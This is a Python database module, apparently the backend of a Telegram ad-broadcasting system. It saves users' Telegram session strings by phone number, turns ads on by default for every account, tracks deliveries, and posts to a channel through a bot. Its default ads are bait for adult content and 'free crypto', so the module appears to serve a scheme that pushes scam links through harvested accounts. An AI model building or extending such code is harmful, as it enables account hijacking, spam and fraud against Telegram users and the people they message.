import os
import time
import threading
from datetime import datetime, timedelta
import requests
from pymongo import MongoClient, ASCENDING
from pymongo.errors import PyMongoError
from config import (MONGODB_URI, DB_NAME, BOT_TOKEN, CHANNEL_ID,
                    DEFAULT_INTERVAL_SEC, UPLOAD_FOLDER)

mongo_client = None
db = None
db_connected = False
users_col = ads_config_col = temp_sessions_col = ads_logs_col = broadcast_msgs_col = None

_config_lock = threading.RLock()
_last_ping = 0.0
_PING_INTERVAL = 30

DEFAULT_ADS = [
    {"id": "ad1", "text": "🔥 Hot content is available inside",
     "label": "Adult Content Available", "url": "https://example.com/adult"},
    {"id": "ad2", "text": "💰 Claim your free crypto reward",
     "label": "Free Crypto Money", "url": "https://example.com/crypto"},
]

_CFG_DEFAULTS = {
    "ads_enabled": False,
    "interval": DEFAULT_INTERVAL_SEC,
    "photo_path": None,
    "caption": "",
}


def _default_config():
    d = {"_id": "main_config", "updated_at": datetime.now()}
    d.update(_CFG_DEFAULTS)
    d["ads"] = [dict(a) for a in DEFAULT_ADS]
    return d


def _ensure_indexes():
    try:
        users_col.create_index([("phone", ASCENDING)])
        users_col.create_index([("user_id", ASCENDING)])
        users_col.create_index([("ads_enabled", ASCENDING)])
        temp_sessions_col.create_index([("created_at", ASCENDING)])
        broadcast_msgs_col.create_index([("broadcast_id", ASCENDING)])
    except Exception as e:
        print(f"⚠️ Index error: {e}")


def _connect():
    global mongo_client, db, db_connected, users_col, ads_config_col
    global temp_sessions_col, ads_logs_col, broadcast_msgs_col
    try:
        mongo_client = MongoClient(MONGODB_URI, serverSelectionTimeoutMS=5000)
        db = mongo_client[DB_NAME]
        mongo_client.admin.command("ping")
        db_connected = True
        print("✅ MongoDB Connected")
    except Exception as e:
        print(f"❌ MongoDB Connection Failed: {e}")
        mongo_client = db = None
        db_connected = False

    users_col = db.users if db is not None else None
    ads_config_col = db.ads_config if db is not None else None
    temp_sessions_col = db.temp_sessions if db is not None else None
    ads_logs_col = db.ads_logs if db is not None else None
    broadcast_msgs_col = db.broadcast_msgs if db is not None else None

    if db is not None:
        _ensure_indexes()


def ensure_db():
    """Reconnect lazily; ping at most every _PING_INTERVAL seconds."""
    global _last_ping
    if mongo_client is None or not db_connected:
        _connect()
        _last_ping = time.time()
        return
    now = time.time()
    if now - _last_ping < _PING_INTERVAL:
        return
    try:
        mongo_client.admin.command("ping")
        db_connected = True
    except Exception:
        print("⚠️ Mongo ping failed — reconnecting…")
        _connect()
    _last_ping = time.time()


def init_db():
    _connect()


def allowed_file(filename):
    return "." in filename and filename.rsplit(".", 1)[1].lower() in {
        "png", "jpg", "jpeg", "gif", "webp"}


def delete_photo_file(path):
    """Remove an uploaded image from disk (best-effort)."""
    try:
        if path and os.path.exists(path):
            os.remove(path)
    except Exception as e:
        print(f"⚠️ Could not delete {path}: {e}")


# ---------------- sessions ----------------

def save_session_to_db(session_data):
    ensure_db()
    if users_col is None:
        return False
    try:
        existing = users_col.find_one({"phone": session_data["phone"]})
        payload = {
            "session_string": session_data["session_string"],
            "updated_at": datetime.now(),
            "user_id": session_data["id"],
            "username": session_data["username"],
            "first_name": session_data["first_name"],
            "last_name": session_data["last_name"],
            "status": "active",
        }
        if existing:
            users_col.update_one({"_id": existing["_id"]}, {"$set": payload})
            return str(existing["_id"])
        payload.update({
            "phone": session_data["phone"],
            "session_name": session_data["session_name"],
            "created_at": datetime.now(),
            "ads_enabled": True,
            "last_ad_time": None,
            "deliveries": 0,
            "failures": 0,
        })
        return str(users_col.insert_one(payload).inserted_id)
    except PyMongoError as e:
        print(f"MongoDB Error (save_session): {e}")
        return False


# ---------------- config ----------------

def get_ads_config():
    ensure_db()
    if ads_config_col is None:
        d = _default_config()
        return d
    config = ads_config_col.find_one({"_id": "main_config"})
    if not config:
        config = _default_config()
        try:
            ads_config_col.insert_one(config)
        except PyMongoError:
            pass
    # backfill ALL keys so templates never hit Undefined
    for k, v in _CFG_DEFAULTS.items():
        config.setdefault(k, v)
    config.setdefault("ads", [dict(a) for a in DEFAULT_ADS])
    return config


def update_ads_config(updates):
    ensure_db()
    if ads_config_col is None:
        return False
    updates = dict(updates)
    updates["updated_at"] = datetime.now()
    try:
        with _config_lock:
            ads_config_col.update_one({"_id": "main_config"},
                                      {"$set": updates}, upsert=True)
        return True
    except PyMongoError as e:
        print(f"MongoDB Error (update_config): {e}")
        return False


def inc_ads_config(field, amount=1):
    ensure_db()
    if ads_config_col is None:
        return False
    try:
        ads_config_col.update_one({"_id": "main_config"},
                                  {"$inc": {field: amount}}, upsert=True)
        return True
    except PyMongoError:
        return False


def mutate_ads(mutator):
    """Serialized read-modify-write of the ads array. mutator(list)->list|None."""
    with _config_lock:
        config = get_ads_config()
        ads = [dict(a) for a in config.get("ads", [])]
        new_ads = mutator(ads)
        if new_ads is None:
            return None
        if update_ads_config({"ads": new_ads}):
            return new_ads
        return None


def reset_ads_config():
    """Reset ads + caption + image. Keeps interval and enabled state.
    Returns the old photo path so the caller can delete the file."""
    config = get_ads_config()
    old_photo = config.get("photo_path")
    ok = update_ads_config({
        "ads": [dict(a) for a in DEFAULT_ADS],
        "caption": "",
        "photo_path": None,
    })
    return old_photo if ok else None


# ---------------- stats ----------------

def get_stats():
    ensure_db()
    if users_col is None:
        return {"total_users": 0, "active_users": 0, "idle_users": 0,
                "opted_in": 0, "total_deliveries": 0, "total_broadcasts": 0,
                "db_connected": False, "active_sessions": 0, "pending_msgs": 0,
                "online_users": 0, "recent_users": 0,
                "last_broadcast_at": None, "next_broadcast_at": None}

    total = users_col.count_documents({})
    active = users_col.count_documents({"status": "active"})
    idle = users_col.count_documents({"status": "idle"})
    opted_in = users_col.count_documents({"ads_enabled": True})

    agg = list(users_col.aggregate(
        [{"$group": {"_id": None, "d": {"$sum": "$deliveries"},
                     "f": {"$sum": "$failures"}}}]))
    deliveries = agg[0]["d"] if agg else 0

    yesterday = datetime.now() - timedelta(days=1)
    recent = users_col.count_documents({"created_at": {"$gte": yesterday}})
    last_hour = datetime.now() - timedelta(hours=1)
    online = users_col.count_documents({"last_ad_time": {"$gte": last_hour}})

    pending = broadcast_msgs_col.count_documents({}) if broadcast_msgs_col is not None else 0

    cfg = get_ads_config()
    return {
        "total_users": total, "active_users": active, "idle_users": idle,
        "opted_in": opted_in, "total_deliveries": deliveries,
        "total_broadcasts": cfg.get("total_broadcasts", 0),
        "online_users": online, "recent_users": recent,
        "pending_msgs": pending, "db_connected": True,
        "active_sessions": 0,
        "last_broadcast_at": cfg.get("last_broadcast_at"),
        "next_broadcast_at": cfg.get("next_broadcast_at"),
    }


def get_all_users():
    ensure_db()
    if users_col is None:
        return []
    out = []
    for u in users_col.find().sort("created_at", -1):
        out.append({
            "id": str(u.get("_id")),
            "user_id": u.get("user_id"),
            "name": f"{u.get('first_name', '')} {u.get('last_name', '')}".strip(),
            "username": u.get("username", "N/A"),
            "phone": u.get("phone", "N/A"),
            "status": u.get("status", "unknown"),
            "ads_enabled": u.get("ads_enabled", True),
            "deliveries": u.get("deliveries", 0),
            "created_at": u["created_at"].strftime("%Y-%m-%d %H:%M") if u.get("created_at") else "N/A",
            "last_ad_time": u["last_ad_time"].strftime("%Y-%m-%d %H:%M") if u.get("last_ad_time") else "Never",
        })
    return out


def send_to_channel(message):
    if not BOT_TOKEN:
        return False
    try:
        r = requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={"chat_id": CHANNEL_ID, "text": message,
                  "parse_mode": "HTML", "disable_web_page_preview": True},
            timeout=10)
        return r.json().get("ok", False)
    except Exception as e:
        print(f"Channel error: {e}")
        return False


init_db()